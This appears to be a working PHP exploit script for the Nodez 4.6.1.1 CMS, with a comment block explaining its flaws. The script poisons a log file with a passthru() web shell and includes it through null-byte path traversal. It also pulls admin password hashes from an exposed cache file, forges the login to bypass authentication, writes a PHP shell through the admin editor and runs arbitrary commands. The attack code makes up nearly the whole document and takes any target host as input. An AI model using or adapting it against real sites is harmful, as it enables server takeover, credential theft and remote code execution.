<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-string">#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;Nodez 4.6.1.1 Mercury (possibly prior versions) multiple vulnerabilities\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n\r\n&quot;;

/*
   software:
   site: nodez.greentinted.com/
   description: Nodez - &quot;An open source  (content management system), designed to
   be flexible, expandable, and as modular as possible.&quot; (ndr: maybe too modular ;) )

   short explaination:
   i) 'op','bop','ext','eop' arguments are not properly sanitized before to
   include files from local resources. You can include arbitrary files
   breaking the path through a null char (%00). Also you can inject
   php code in cache/ext/statman/log.gtdat file and launch commands
   including it, poc:

   http://[target]/[path]/index.php?node=system&amp;op=extop&amp;ext=statman&amp;eop=/visitor&amp;ip=[code]

   http://[target]/[path]/index.php?node=system&amp;op=blockop&amp;block=3&amp;bop=../../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&amp;op=../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&amp;op=extop&amp;ext=statman&amp;eop=../../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&amp;op=extop&amp;ext=../../cache/ext/statman/log.gtdat%00

   ii)
   to list all files on target system:
   http://[target]/[path_to_nodez]/countlines.php

   iii)last but not least, the most chritical issue:

   you can view all admin/users md5 password hashes, ex:

   http://[target]/[path_to_nodez]/cache/users/list.gtdat

   (if you do not believe it, give a look to the online demo:
   http://demo.opensourcecms.com/nodez/cache/users/list.gtdat)

   this because nodez do not provide an .htaccess file for users folder

   you don't need to force it to login as admin, you can
   craft a $_POST['upass'] value,ex:

   [admin_md5_hash][md5(&quot;rndval[numbers]&quot;)]

   this string should be calculated by a nodez javascript, but
   you can easily do by yourself (the second fragment is inside
   login page, something like &quot;rndval[random_numbers]&quot; )

   once you have an admin session cookie, you can create and edit php files
   (System options -&gt; Toolbox -&gt; Super Edit) and launch commands from them

   this exploit makes the dirty work for i) and iii)
                                                                              */
if ($argc&lt;3) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path action cmd OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to nodez\r\n&quot;;
echo &quot;action:    1 - through arbitrary local inclusion\r\n&quot;;
echo &quot;               (works with magic_quotes_gpc= Off)\r\n&quot;;
echo &quot;           2 - through admin authentication bypass\r\n&quot;;
echo &quot;               (no php.ini restriction, you need the\r\n&quot;;
echo &quot;               list.gtdat file)\r\n&quot;;
echo &quot;cmd:       a shell command\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /nodez/ 2 ls -la\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /nodez/ 1 cat ./cache/users/list.gtdat\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /nodez/ 1 cat ./cache/users/list.gtdat -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /nodez/ 1 cat ./cache/users/list.gtdat -P1.1.1.1:80\r\n&quot;;
die;
}

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$action=$argv[3];
$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;

for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
$cmd=urlencode($cmd);

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo &quot;action selected -&gt; &quot;.$action.&quot;\r\n&quot;;
if ($action==&quot;1&quot;)
{

echo &quot;[1] Injecting some code in log.gtdat file...\r\n&quot;;
$CODE ='&lt;?php;ob_clean();echo(666);'; //notice the trick to work with short_open_tag off
$CODE.='passthru($_GET[cmd]);echo(666);die;?&gt;';
$packet=&quot;GET &quot;.$p.&quot;index.php?node=system&amp;op=extop&amp;ext=statman&amp;eop=/visitor&amp;ip=&quot;.$CODE.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: close\r\n\r\n&quot;;
#echo quick_dump($packet);
sendpacketii($packet);
sleep(1);
$xpl=array ( '&amp;op=blockop&amp;block=3&amp;bop=../../../../cache/ext/statman/log.gtdat%00',
             '&amp;op=../../../cache/ext/statman/log.gtdat%00',
             '&amp;op=extop&amp;ext=statman&amp;eop=../../../../cache/ext/statman/log.gtdat%00',
             '&amp;op=extop&amp;ext=../../cache/ext/statman/log.gtdat%00'
            );

for ($i=0; $i&lt;=count($xpl)-1;$i++)
{
$a=$i+2;
echo &quot;[&quot;.$a.&quot;] Trying with &quot;.$xpl[$i].&quot;\r\n&quot;;
$packet=&quot;GET &quot;.$p.&quot;index.php?cmd=&quot;.$cmd.&quot;&amp;node=system&quot;.$xpl[$i].&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,&quot;666&quot;))
{
echo &quot;Exploit succeeded...\r\n&quot;;
$temp=explode(&quot;666&quot;,$html);
echo $temp[1];
die;
}
}
}
else
if ($action==&quot;2&quot;)
{
 echo &quot;[1] Looking for list.gtdat file...\r\n&quot;;
 $packet=&quot;GET &quot;.$p.&quot;cache/users/list.gtdat HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (strstr($html,&quot;200 OK&quot;))
 { echo &quot;Done...we have list.gtdat file\r\n&quot;;
 }
 else
 {die(&quot;Exploit failed...&quot;);}
 $temp=explode(&quot;:\&quot;&quot;,$html);
 $temp2=explode(&quot;\&quot;&quot;,$temp[1]);
 $adm=$temp2[0];
 echo &quot;admin -&gt; &quot;.$adm.&quot;\r\n&quot;;
 $temp2=explode(&quot;\&quot;&quot;,$temp[3]);
 $hash=$temp2[0];
 echo &quot;hash -&gt; &quot;.$hash.&quot;\r\n&quot;;

 echo &quot;[2] Grab some data from login page...\r\n&quot;;
 $packet=&quot;GET &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 #echo quick_dump($packet);
 sendpacketii($packet);
 $temp=explode(&quot;+hex_md5('&quot;,$html);
 $temp2=explode(&quot;'&quot;,$temp[1]);
 echo &quot;our string -&gt; &quot;.$temp2[0].&quot;\r\n&quot;;
 $mypass=$hash.md5($temp2[0]);
 echo &quot;our passport to heaven -&gt;&quot;.$mypass.&quot;\r\n&quot;;
 $temp=explode(&quot;Set-Cookie: &quot;,$html);
 $temp2=explode(&quot; &quot;,$temp[1]);
 $cookie=$temp2[0];
 echo &quot;cookie -&gt; &quot;.$cookie.&quot;\r\n&quot;;

 echo &quot;[3] Login...\r\n&quot;;
 $data =&quot;uname=&quot;.urlencode($adm);
 $data.=&quot;&amp;upass=&quot;.urlencode($mypass);
 $data.=&quot;&amp;node=system&quot;;
 $data.=&quot;&amp;ref=node%3Dsystem%26op%3Dlogout&quot;;
 $data.=&quot;&amp;op=login&quot;;
 $packet =&quot;POST &quot;.$p.&quot;index.php? HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: $host\r\n&quot;;
 $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
 $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
 $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (eregi(&quot;Welcome back&quot;,$html)) {echo &quot;Logged in...\r\n&quot;;}
                             else {die(&quot;Exploit failed...\r\n&quot;);}
 srand(make_seed());
 $anumber = rand(1,99999);

 echo &quot;[4] Let's create a nodez id...\r\n&quot;;
 $packet =&quot;GET &quot;.$p.&quot;?node=system&amp;op=advanced/superedit&amp;step=edit&amp;id=suntzu&quot;.$anumber.&quot; HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo &quot;[5] Let's create the php file...\r\n&quot;;
 $data =&quot;title=suntzu&quot;.$anumber;
 $data.=&quot;&amp;type=blog&quot;;
 $data.=&quot;&amp;path=../suntzu&quot;.$anumber.&quot;.php&quot;;
 $data.=&quot;&amp;hits=0&quot;;
 $data.=&quot;&amp;date=now&quot;;
 $packet= &quot;POST &quot;.$p.&quot;?node=system&amp;op=advanced/superedit&amp;step=save&amp;id=../suntzu&quot;.$anumber.&quot;.php HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
 $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
 $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo &quot;[6] Let's save the evil code ...\r\n&quot;;
 $data =&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;node\&quot;\r\n\r\n&quot;;
 $data.=&quot;system\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;op\&quot;\r\n\r\n&quot;;
 $data.=&quot;editfile\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;step\&quot;\r\n\r\n&quot;;
 $data.=&quot;finish\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;parent\&quot;\r\n\r\n&quot;;
 $data.=&quot;../suntzu&quot;.$anumber.&quot;.php\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;nodez_title\&quot;\r\n\r\n&quot;;
 $data.=&quot;suntzu&quot;.$anumber.&quot;\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;nodez_longtitle\&quot;\r\n\r\n&quot;;
 $data.=&quot;suntzu&quot;.$anumber.&quot;\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;nodez_body\&quot;\r\n\r\n&quot;;
 $data.=&quot;&lt;?php if(get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}echo 666;\r\n&quot;;
 $data.=&quot;passthru(\$_GET[cmd]);echo 666;?&gt;\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;author\&quot;\r\n\r\n&quot;;
 $data.=&quot;suntzu\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;areg\&quot;\r\n\r\n&quot;;
 $data.=&quot;0\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;mood\&quot;\r\n\r\n&quot;;
 $data.=&quot;\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $data.=&quot;Content-Disposition: form-data; name=\&quot;music\&quot;\r\n\r\n&quot;;
 $data.=&quot;\r\n&quot;;
 $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
 $packet =&quot;POST &quot;.$p.&quot;index.php? HTTP/1.1\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n&quot;;
 $packet.=&quot;Cookie:&quot;.$cookie.&quot;\r\n&quot;;
 $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
 $packet.=&quot;Content-Type: multipart/form-data; boundary=----------lNnHj26YsSTIS0qSMhw5MK\r\n\r\n&quot;;
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo &quot;[7] Launch commands...\r\n\r\n&quot;;
 $packet =&quot;GET &quot;.$p.&quot;suntzu&quot;.$anumber.&quot;.php?cmd=&quot;.$cmd.&quot; HTTP/1.0\r\n&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (strstr($html,&quot;666&quot;))
 {
  echo &quot;Exploit succeeded...\r\n\r\n&quot;;
  $temp=explode(&quot;666&quot;,$html);
  echo $temp[1];
  die;
 }
}
else
{die (&quot;Wrong action...\r\n&quot;);}
//if you are here...
echo &quot;Exploit failed...\r\n&quot;;
?&gt;


</span></span>
</code></pre>
